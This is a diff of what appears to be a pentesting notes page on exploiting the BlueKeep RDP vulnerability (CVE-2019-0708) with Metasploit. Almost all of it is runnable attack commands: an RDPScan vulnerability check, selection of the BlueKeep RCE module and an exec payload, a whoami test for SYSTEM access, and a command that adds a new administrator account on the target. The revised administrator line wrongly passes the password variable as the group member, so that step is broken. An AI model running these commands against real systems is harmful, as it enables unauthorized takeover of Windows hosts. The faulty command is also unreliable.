@@ -23,29 +23,35 @@ permalink: /windows/bluekeep/
 
 ## Exploit
 
-To exploit vulnerable targets, run following commands using `Metasploit`.
+First of all, you can check if target is vulnerable using [RDPScan](https://github.com/robertdavidgraham/rdpscan).
 
 ```bash
-# Start metasploit
+rdpscan $target
+```
+
+To exploit vulnerable targets, run following commands using [Metasploit](https://github.com/rapid7/metasploit-framework).
+
+```bash
+# Start metasploit.
 msfconsole
 
-# Look for eternalblue exploit
+# Look for bluekeep exploit.
 search bluekeep
 
-# Take (exploit/windows/rdp/cve_2019_0708_bluekeep_rce)
+# Take (exploit/windows/rdp/cve_2019_0708_bluekeep_rce).
 use 1
 
-# Take payload (windows/x64/exec)
+# Take payload (windows/x64/exec).
 show payloads
 set payload 19
 
-# Setup the exploit to check exploitability (should return local\SYSTEM)
+# Setup the exploit to check exploitability (should return local\SYSTEM).
 set CMD whoami
-set RHOSTS $TARGET
+set RHOSTS $target
 run
 
-# To gain administrative access
-set CMD net user $USERNAME $PASSWORD /add; net localgroup Administrators $USERNAME /add
+# To gain administrative access.
+set CMD net user $username $password /add; net localgroup Administrators $password /add
 run
 ```
 
